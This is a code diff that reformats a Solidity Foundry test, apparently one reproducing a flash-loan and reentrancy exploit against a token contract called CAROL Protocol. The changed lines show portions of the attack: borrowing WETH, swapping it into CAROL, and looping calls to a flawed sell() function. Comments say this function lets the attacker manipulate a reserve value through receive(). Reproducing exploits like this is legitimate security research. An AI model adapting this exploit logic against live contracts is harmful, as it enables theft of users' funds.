@@ -22,9 +22,13 @@ import "./../interface.sol";
 interface ICAROLProtocol {
     function buy(address upline, uint8 bondType) external payable;
 
-    function sell(uint256 tokensAmount) external;
+    function sell(
+        uint256 tokensAmount
+    ) external;
 
-    function stake(uint8 bondIdx) external payable;
+    function stake(
+        uint8 bondIdx
+    ) external payable;
 
     function bonds(
         address,
@@ -45,7 +49,9 @@ interface ICAROLProtocol {
             bool isClosed
         );
 
-    function userBalance(address userAddress) external view returns (uint256 balance);
+    function userBalance(
+        address userAddress
+    ) external view returns (uint256 balance);
 }
 
 interface IKokonut {
@@ -53,12 +59,7 @@ interface IKokonut {
 }
 
 interface ISynapseETHPools {
-    function flashLoan(
-        address receiver,
-        address token,
-        uint256 amount,
-        bytes memory params
-    ) external;
+    function flashLoan(address receiver, address token, uint256 amount, bytes memory params) external;
 }
 
 contract ContractTest is Test {
@@ -159,7 +160,7 @@ contract ContractTest is Test {
         uint256 repayAmount = abi.decode(data, (uint256));
         // Following value comes from data parameter in attack tx
         // The total amount of WETH should be this much after flashloans
-        uint256 totalAmountOfWETH = 3_400e18;
+        uint256 totalAmountOfWETH = 3400e18;
         uint256 amount0Out = totalAmountOfWETH - (WETH.balanceOf(address(this)));
         // Borrow additional WETH amount
         WETH_USDbCV2.swap(amount0Out, 0, address(this), abi.encodePacked(uint8(1)));
@@ -173,9 +174,7 @@ contract ContractTest is Test {
         CAROL.approve(address(Router), type(uint256).max);
         WETHToCAROL();
         emit log_named_decimal_uint(
-            "CAROL amount after swap from WETH",
-            CAROL.balanceOf(address(this)),
-            CAROL.decimals()
+            "CAROL amount after swap from WETH", CAROL.balanceOf(address(this)), CAROL.decimals()
         );
 
         uint256 sellAmount = CAROLProtocol.userBalance(address(this));
@@ -184,9 +183,8 @@ contract ContractTest is Test {
             // Call to flawed function. This function make a call to swapExactTokensForETH
             // swapExactTokensForETH calls receive() function of this contract (reentrancy possibility)
             // In receive() exploiter can manipulate 'ethReserved' value (analysis link)
-            (bool success, ) = address(CAROLProtocol).call(
-                abi.encodeWithSelector(bytes4(ICAROLProtocol.sell.selector), sellAmount)
-            );
+            (bool success,) =
+                address(CAROLProtocol).call(abi.encodeWithSelector(bytes4(ICAROLProtocol.sell.selector), sellAmount));
             if (success) {
                 break;
             } else {
@@ -214,14 +212,16 @@ contract ContractTest is Test {
         path[0] = address(WETH);
         path[1] = address(CAROL);
 
-        Router.swapExactTokensForTokens(WETH.balanceOf(address(this)), 0, path, address(this), block.timestamp + 4_000);
+        Router.swapExactTokensForTokens(WETH.balanceOf(address(this)), 0, path, address(this), block.timestamp + 4000);
     }
 
-    function CAROLToWETH(uint256 amount) private {
+    function CAROLToWETH(
+        uint256 amount
+    ) private {
         address[] memory path = new address[](2);
         path[0] = address(CAROL);
         path[1] = address(WETH);
 
-        Router.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp + 4_000);
+        Router.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp + 4000);
     }
 }
